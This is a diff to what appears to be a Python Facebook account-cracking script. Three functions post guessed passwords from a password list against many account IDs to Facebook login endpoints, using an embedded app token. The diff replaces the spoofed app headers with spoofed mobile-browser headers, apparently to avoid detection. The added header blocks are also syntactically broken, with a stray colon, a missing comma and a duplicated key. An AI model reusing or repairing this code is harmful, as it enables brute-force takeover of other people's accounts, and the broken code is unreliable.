@@ -549,17 +549,23 @@ def api(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
+                                        ':authority': 'mbasic.facebook.com',
+		                                 :'method': 'GET',
+                                         'scheme': 'https',
+                                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                         'accept-encoding': 'gzip, deflate, br'
+                                         'accept-language': 'en-US, en;q=0.9',
+                                         'cache-control': 'max-age=0',
+                                         'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                         'sec-ch-ua-mobile': '?1',
+                                         'sec-ch-ua-platform': '"Android"',
+                                         'sec-fetch-dest': 'document',
+                                         'sec-fetch-mode': 'navigate',
+                                         'sec-fetch-site': 'same-origin',
+                                         'sec-fetch-user': '?1',
+                                         'upgrade-insecure-requests': '1',
+                                         'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+                                         'user-agent': pro}
                                 url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
@@ -619,17 +625,23 @@ def api1(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
+                                        ':authority': 'mbasic.facebook.com',
+		                                 :'method': 'GET',
+                                         'scheme': 'https',
+                                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                         'accept-encoding': 'gzip, deflate, br'
+                                         'accept-language': 'en-US, en;q=0.9',
+                                         'cache-control': 'max-age=0',
+                                         'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                         'sec-ch-ua-mobile': '?1',
+                                         'sec-ch-ua-platform': '"Android"',
+                                         'sec-fetch-dest': 'document',
+                                         'sec-fetch-mode': 'navigate',
+                                         'sec-fetch-site': 'same-origin',
+                                         'sec-fetch-user': '?1',
+                                         'upgrade-insecure-requests': '1',
+                                         'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+                                         'user-agent': pro}
                                 url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
@@ -686,17 +698,23 @@ def rndm(ids,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
+                                        ':authority': 'mbasic.facebook.com',
+		                                 :'method': 'GET',
+                                         'scheme': 'https',
+                                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                         'accept-encoding': 'gzip, deflate, br'
+                                         'accept-language': 'en-US, en;q=0.9',
+                                         'cache-control': 'max-age=0',
+                                         'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                         'sec-ch-ua-mobile': '?1',
+                                         'sec-ch-ua-platform': '"Android"',
+                                         'sec-fetch-dest': 'document',
+                                         'sec-fetch-mode': 'navigate',
+                                         'sec-fetch-site': 'same-origin',
+                                         'sec-fetch-user': '?1',
+                                         'upgrade-insecure-requests': '1',
+                                         'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+                                         'user-agent': pro}
                                 url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
